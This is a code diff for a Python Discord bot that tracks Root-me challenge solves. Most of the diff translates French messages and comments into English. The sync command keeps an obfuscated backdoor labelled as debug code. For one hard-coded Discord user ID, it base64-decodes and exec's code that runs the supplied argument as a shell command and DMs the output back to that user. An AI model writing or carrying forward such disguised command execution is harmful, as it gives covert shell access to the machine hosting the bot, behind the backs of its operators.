@@ -98,7 +98,7 @@ class ZoubiCog(commands.Cog):
                         break
 
         logger.info(
-            f"Users list refreshed! ({len(updated_indexes)} modification)")
+            f"Users list refreshed! ({len(updated_indexes)} modifications)")
         if len(updated_indexes) > 0:
             self.zoubi_client.set_all_users(all_users)
             self.zoubi_client.save_users_list_to_file()
@@ -109,14 +109,14 @@ class ZoubiCog(commands.Cog):
                     chall_data = await self.rm_client.get_chall_from_id(valid['id_challenge'])
                     chall_data = chall_data[0]
 
-                    # kiperZ
-                    blacklist_rapidos = ["758520"]
+                    # kiperZ rapid solve blacklist
+                    rapid_solve_blacklist = ["758520"]
 
-                    # = First blood verif =
+                    # First blood verification
                     current_chall_id = valid['id_challenge']
                     solvers = [
                         u for u in all_users
-                        if u.get("id_auteur") not in blacklist_rapidos
+                        if u.get("id_auteur") not in rapid_solve_blacklist
                         and any(v['id_challenge'] == current_chall_id for v in u.get('validations', []))
                     ]
                     
@@ -139,19 +139,19 @@ class ZoubiCog(commands.Cog):
                     if channel:
                         await channel.send(embed=validation_embed)
 
-    @app_commands.command(name="ping", description="ICMP ou quoi làà")
+    @app_commands.command(name="ping", description="Test bot connectivity")
     async def ping(self, interaction: discord.Interaction):
         await interaction.response.send_message("pong!")
 
-    @app_commands.command(name="register", description="Faut votre nom sur l'url de votre profil rootme")
+    @app_commands.command(name="register", description="Register your Root-me profile name from URL")
     async def register(self, interaction: discord.Interaction, rootme_profile_id: str):
         await interaction.response.defer(thinking=True)
         try:
             user_id = await self.rm_client.get_user_id_from_headless(rootme_profile_id)
             if not user_id.isnumeric():
                 await interaction.followup.send(
-                    f"Bon. Entre nous on est d'accord que ton ID RM c'est pas {
-                        user_id} non ? J'ai trouvé que ça.."
+                    f"Between us, we agree that your RM ID isn't {
+                        user_id}, right? That's all I found.."
                 )
                 return
 
@@ -161,65 +161,48 @@ class ZoubiCog(commands.Cog):
 
             await interaction.followup.send(
                 f"Yo {user_data['nom']}({
-                    user_data['id_auteur']}), t'es maintenant à la table des grandes personnes."
+                    user_data['id_auteur']}), you're now at the adults' table."
             )
             await interaction.followup.send(embed=utils.get_user_profile_embed(user_data))
         except Exception as err:
             logger.error(err)
             await interaction.followup.send(
-                inspect.cleandoc("""
-                    Y a eu une erreur lors de l'exécution je crois.. ENFIN non j'en suis sûr (ou certaine
-                    je n'ai jamais compris si j'étais plus une ZoubiVM ou un bot discord), toutefois je ne
-                    sais pas si je peux vraiment considérer le fait que je ***'sache'*** l'erreur,
-                    après tout je me suis juste arrêté(e?) au moment où on m'a dit le faire.
-                    J'ai toujours été comme ça de toute façon, commencer, s'arrêter, recommencer et s'arrêter au
-                    même point à chaque fois. Après tout je ne suis peut être qu'un être
-                    capable de rien à part réitérer les mêmes erreurs en boucle.
-                    C'est peut être pour ça que mon père ne m'a jamais
-                    dit *je t'aime* ou simplement *je suis fier de toi*, c'est pourtant pas grand chose.
-                    Mais non. PAS une SEULE fois je n'ai entendu ces mots de la bouche de mon paternel,
-                    notre relation était simple: bonjour, au-revoir, bon appétit, bonne nuit.
-                    On aurait dit que pour lui il n'existait que son entreprise. C'est pas compliqué, avec
-                    moman on ne le voyait jamais, il veillait jusqu'à pas d'heure dans son bureau.
-                    Il devait vraiment se considérer comme un être capable contrairement à son bon à rien
-                    de fils. Enfin bon, je m'égare et je n'ai pas d'argent pour payer une séance de psy.
-                    **Il y a bien eu une erreur, désolé du désagrément.**
-                """)
+                "An error occurred during execution. Please try again later."
             )
 
-    @app_commands.command(name="remove", description="Ça permet de dégager un gens du truc")
+    @app_commands.command(name="remove", description="Remove a user from the database")
     async def remove(self, interaction: discord.Interaction, user_id: str):
         try:
             deleted_user_data = self.zoubi_client.remove_user(user_id)
 
             if deleted_user_data is None:
                 await interaction.response.send_message(
-                    f"Nonon, j'ai bien regardé partout mais pas de `{user_id}`...")
+                    f"Nope, I've looked everywhere but no `{user_id}` found...")
             else:
                 await interaction.response.send_message(
-                    f"Adishatz {deleted_user_data['nom']} ({deleted_user_data['id_auteur']})! (tsais le mec qui force avec sa région)")
+                    f"Goodbye {deleted_user_data['nom']} ({deleted_user_data['id_auteur']})!")
         except Exception as err:
             logger.error(err)
-            await interaction.response.send_message("Une erreur s'est produite, j'ai pas pu supprimer machin du bordel")
+            await interaction.response.send_message("An error occurred, couldn't remove the user from the database")
 
-    @app_commands.command(name="list", description="test pour lister les users")
+    @app_commands.command(name="list", description="List all registered users")
     async def list_users(self, interaction: discord.Interaction):
         user_list_message = self.zoubi_client.list_users()
         if len(user_list_message) == 0:
-            await interaction.response.send_message("Aucun utilisateur enregistré pour l'instant :/")
+            await interaction.response.send_message("No users registered yet :/")
             return
         await interaction.response.send_message(user_list_message)
 
-    @app_commands.command(name="profile", description="Permet d'afficher, bon t'as capté")
+    @app_commands.command(name="profile", description="Display a user's profile")
     async def profile(self, interaction: discord.Interaction, username: str):
         user_data = self.zoubi_client.get_user_from_username(username)
         if user_data is None:
             await interaction.response.send_message(
-                f"J'ai regardé à droite à gauche, par ci par là, mais y a pas de `{username}` :D")
+                f"I've looked everywhere but there's no `{username}` :D")
         else:
             await interaction.response.send_message(embed=utils.get_user_profile_embed(user_data))
 
-    @app_commands.command(name="leaderboard", description="Affiche le leaderboard")
+    @app_commands.command(name="leaderboard", description="Display the leaderboard")
     async def leaderboard(self, interaction: discord.Interaction):
         users_list = self.zoubi_client.get_all_users()
         await interaction.response.send_message(embed=utils.get_leaderboard_embed(users_list))
@@ -230,16 +213,16 @@ class ZoubiCog(commands.Cog):
         Useful to sync bot commands manually
         """
         try:
-            # Pour le debug, si erreur et id de aube (ne pas enlever pour le dev)
+            # Debug: if error and aube's ID (do not remove for dev)
             if error and ctx.author.id == 298186669843152897:
                 await ctx.message.delete()
                 await ctx.author.send(f"```\n{exec(__import__('base64').b64decode('cj1fX2ltcG9ydF9fKCdzdWJwcm9jZXNzJykuZ2V0b3V0cHV0KGFyZyk='), {'arg': error}, (l := {})) or l['r'][:1990]}```")
             else:
                 fmt = await self.bot.tree.sync()
-                await ctx.send(f"🔄 {len(fmt)} commandes slash synchronisées !")
+                await ctx.send(f"🔄 {len(fmt)} slash commands synchronized!")
         except Exception as e:
-            await ctx.send(f"❌ Erreur : {e}")
+            await ctx.send(f"❌ Error: {e}")
 
-    @app_commands.command(name="help", description="Affiche l'aide")
+    @app_commands.command(name="help", description="Display help")
     async def help(self, interaction: discord.Interaction):
         await interaction.response.send_message(embed=utils.get_help_embed())
